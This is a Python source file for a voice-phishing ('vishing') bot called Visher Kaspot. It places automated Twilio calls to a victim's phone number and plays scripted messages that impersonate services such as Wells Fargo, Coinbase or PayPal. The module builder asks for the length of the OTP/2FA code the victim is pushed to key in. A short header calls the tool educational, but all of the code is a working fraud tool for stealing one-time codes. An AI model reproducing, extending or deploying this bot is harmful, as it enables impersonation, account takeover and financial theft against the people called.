#Python 3.8.10

#===========================================
#                                          #
#              VISHER KASPOT               #
#                                          #
#    BOT BY KASPER(@t_h_e_k_a_s_p_e_r)     #
#                                          #
#    WE DONT ACCEPT OR ARE RESPONSIBLE OF  #
#     ANY ILLEGAL USAGE OF THIS BOT.       #
#       IT IS MADE ONLY FOR EDUCATIONAL    #
#                 PURPOSE.                 #
#                                          #
#===========================================


import os 
import time
import shutil
from colorama import Fore, init
from twilio.rest import Client
from configparser import ConfigParser
init(True)


#Creating A New Class "call"

class call:
    def __init__(self) -> None:
        self.sid = None
        self.token = None
        self.from_num = None
        self.server_url = None
        self.settings()


#Defining Function for parsing settings.ini.

    def settings(self):
        parser = ConfigParser()
        parser.read("settings.ini")
        self.sid = parser.get("Twilio", "Twilio_SID")
        self.token = parser.get("Twilio", "Twilio_Token")
        self.from_num = parser.get("Twilio", "Twilio_Number")
        self.server_url = parser.get("Server", "URL")


#Defining Function To Print Bot's Banner.

    def visher_banner(self):
        os.system('cls')
        columns = shutil.get_terminal_size().columns
        print(Fore.RED + " /$$    /$$ /$$$$$$  /$$$$$$  /$$   /$$ /$$$$$$$$ /$$$$$$$        /$$   /$$  /$$$$$$   /$$$$$$  /$$$$$$$   /$$$$$$  /$$$$$$$$".center(columns)); time.sleep(0.07)
        print(Fore.RED + "| $$   | $$|_  $$_/ /$$__  $$| $$  | $$| $$_____/| $$__  $$      | $$  /$$/ /$$__  $$ /$$__  $$| $$__  $$ /$$__  $$|__  $$__/".center(columns)); time.sleep(0.07)
        print(Fore.RED + "| $$   | $$  | $$  | $$  \__/| $$  | $$| $$      | $$  \ $$      | $$ /$$/ | $$  \ $$| $$  \__/| $$  \ $$| $$  \ $$   | $$   ".center(columns)); time.sleep(0.07)
        print(Fore.RED + "|  $$ / $$/  | $$  |  $$$$$$ | $$$$$$$$| $$$$$   | $$$$$$$/      | $$$$$/  | $$$$$$$$|  $$$$$$ | $$$$$$$/| $$  | $$   | $$   ".center(columns)); time.sleep(0.07)
        print(Fore.RED + " \  $$ $$/   | $$   \____  $$| $$__  $$| $$__/   | $$__  $$      | $$  $$  | $$__  $$ \____  $$| $$____/ | $$  | $$   | $$   ".center(columns)); time.sleep(0.07)
        print(Fore.RED + "  \  $$$/    | $$   /$$  \ $$| $$  | $$| $$      | $$  \ $$      | $$\  $$ | $$  | $$ /$$  \ $$| $$      | $$  | $$   | $$   ".center(columns)); time.sleep(0.07)
        print(Fore.RED + "   \  $/    /$$$$$$|  $$$$$$/| $$  | $$| $$$$$$$$| $$  | $$      | $$ \  $$| $$  | $$|  $$$$$$/| $$      |  $$$$$$/   | $$   ".center(columns)); time.sleep(0.07)
        print(Fore.RED + "    \_/    |______/ \______/ |__/  |__/|________/|__/  |__/      |__/  \__/|__/  |__/ \______/ |__/       \______/    |__/   ".center(columns)); time.sleep(0.07)
        print(Fore.RED + "                                                                                                                             ".center(columns)); time.sleep(0.07)
        print(Fore.YELLOW + "# A KASPOT FOR VISHING.                                                                                                      ".center(columns)); time.sleep(0.07)
        print(Fore.CYAN + "                           Created By Kasper(@t_h_e_k_a_s_p_e_r) | Thanks To Genos(@CallmeGenos)                            ".center(columns)); time.sleep(0.07)
        print(Fore.CYAN + "                                                 Telegram:@hackers_assemble                                                       ".center(columns)); time.sleep(0.07)
        print("\n\n\n")


#Defining The Funtion "features" To list and run all bot features.

    def features(self):
        self.visher_banner()
        print(f"{Fore.CYAN}[#visher@kaspot]: {Fore.GREEN}Select An Option : \n")
        print(f"{Fore.RED}[1] {Fore.GREEN}Call the Victim")
        print(f"{Fore.RED}[2] {Fore.GREEN}Craft a Module")
        choice = input(f"\n{Fore.CYAN}[#visher@kaspot]: {Fore.GREEN}Input Your Selection : {Fore.WHITE}")

        if choice == "1":
            self.visher_banner()
            self.select_module()
            input(f"\n\n{Fore.GREEN}Now Run The bot.py Script And Press Enter To Start Call")
            self.call_victim()
        
        elif choice == "2":
            self.craft_module()

        else:
            input(f"{Fore.CYAN}[#visher@kaspot]: {Fore.RED}Incorrect Option Selected, Please Try Again")
            self.features()


#Defining Function "select_module" To Select The Created Modules.

    def select_module(self) -> None:
        print(f"{Fore.RED}[~] {Fore.GREEN}Select A Module : \n")
        modules = os.listdir("modules")
        for i in range(len(modules)):
            if "Main.ini" not in modules[i]:
                print(f"{Fore.RED}[{i}] {Fore.GREEN}{modules[i].replace('_', ' ').replace('.ini', '')}")
        
        choice = int(input(f"\n{Fore.CYAN}[#visher@kaspot]: {Fore.GREEN}Input The Name Of The Module To Use : "))

        with open(f"modules/{modules[choice]}") as file:
            full_msg = file.read()
        
        with open(f"modules/Main.ini", "w") as new_file:
            new_file.write(full_msg)        


#Defining Function "call_victim" To Call The Victim.

    def call_victim(self):
        vic_num = input(f"{Fore.CYAN}[#visher@kaspot]: {Fore.GREEN}Input Victim's Number [ With the country code and '+' ] :")
        try:
            client = Client(self.sid, self.token)
            client.calls.create(
                url=self.server_url,
                to=vic_num,
                from_=self.from_num
            )
            input(f"{Fore.CYAN}[#visher@kaspot]: {Fore.GREEN}Successfully Called {vic_num}")

        except Exception as e:
            print("An Error Has Occured : \n\n\n")
            input(e)
#Defining Function "craft_module" To Craft Custome Modules For The Bot.
    def craft_module(self) -> None:
        self.visher_banner()
    #Configuring values for the config.ini file.
        module_name = input(f"{Fore.CYAN}[#visher@kaspot]: {Fore.GREEN}Name Your Module [Eg: WellsFArgo, Coinbase, PayPal] : {Fore.WHITE}").replace(" ", "_")
        letter_msg = input(f"{Fore.CYAN}\n[#visher@kaspot]: {Fore.GREEN}Input The Message To Be Spoken By The Bot To The Victim :- \n{Fore.GREEN}[>>] {Fore.WHITE}")
        no_otp_msg = input(f"{Fore.CYAN}\n[#visher@kaspot]: {Fore.GREEN}Input The Message To Be Spoken If Victim Doesn't Enter Any Code :- \n{Fore.GREEN}[>>] {Fore.WHITE}")
        success_msg = input(f"{Fore.CYAN}\n[#visher@kaspot]: {Fore.GREEN}Input The Message To Be Spoken To The Victim If The Call Was Successful :- \n{Fore.GREEN}[>>] {Fore.WHITE}")
        otp_length = input(f"{Fore.CYAN}\n[#visher@kaspot]: {Fore.GREEN}Input The Length For The OTP/2FA Code : {Fore.WHITE}")

        with open(f"modules/{module_name}.ini","w") as config:
    #Generating the Config For the Crafted Module.
            config.write("[Message]\n")
            config.write(f"Main={letter_msg}\n")
            config.write(f"Retry={no_otp_msg}\n")
            config.write(f"Final={success_msg}\n")
            config.write(f"Digits={otp_length}")

        print(f"\n\n{Fore.CYAN}[#visher@kaspot]: {Fore.GREEN}Successfully Crafted A New Module")
        time.sleep(2)        
















if __name__ == "__main__":
    Call = call()
    while True:
        Call.features()
       